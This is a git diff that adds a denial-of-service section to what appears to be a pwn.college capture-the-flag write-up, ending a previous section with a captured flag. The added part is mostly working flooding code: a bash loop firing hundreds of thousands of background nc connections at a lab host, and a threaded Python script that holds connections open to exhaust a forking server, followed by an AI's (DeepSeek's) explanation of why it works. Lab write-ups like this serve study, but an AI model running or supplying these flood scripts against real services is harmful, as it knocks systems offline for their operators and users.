@@ -516,3 +516,53 @@ Connection received on 10.0.0.2 36488
 pwn.college{0ZEFN5Rm7pckFqOH019zoI2BF6r.QX1YzMzwyMyITOyEzW}
 ```
 
+## Denial of Service 1, 2, 3
+
+This solves challenge 1 and 2.
+
+```
+root@ip-10-0-0-1:~# cat dos.sh
+#!/bin/bash
+for i in {1..500000}; do
+  nc 10.0.0.2 31337 &
+  sleep 0.00003
+done
+wait
+```
+
+Challenge 3 is very difficult wtf. Found this script on github (`dos_3.md`) and it works!
+```python
+# dos.py
+import socket
+import time
+import threading
+
+def spam():
+    while True:
+        try:
+            s = socket.create_connection(("10.0.0.2", 31337), timeout=2)
+            time.sleep(1.2) # close the connection after the socket is terminated by the server
+            s.close()
+        except:
+            pass
+
+for _ in range(600):  # tweak based on system capacity
+    threading.Thread(target=spam, daemon=True).start()
+
+time.sleep(120)  # let it run long enough to disrupt
+```
+
+DeepSeek's explanation of this script:
+```md
+The server limits each session to 1 second. By sleeping for 1.2 seconds before closing, you're:
+* Holding each connection open slightly longer than the server's limit
+* Forcing the server to manage more concurrent connections
+* The server has to fork a new process for each connection, but you're making them last just long enough to exhaust resources
+
+True Parallelism with Threads:
+* 600 concurrent threads each maintaining their own connection
+* Bash's & creates processes (heavier), threads are lighter weight
+* You can create many more connections before hitting system limits
+
+Python's `socket.create_connection()` handles the TCP handshake efficiently at the C level, while bash's `/dev/tcp` or `nc` add overhead
+```
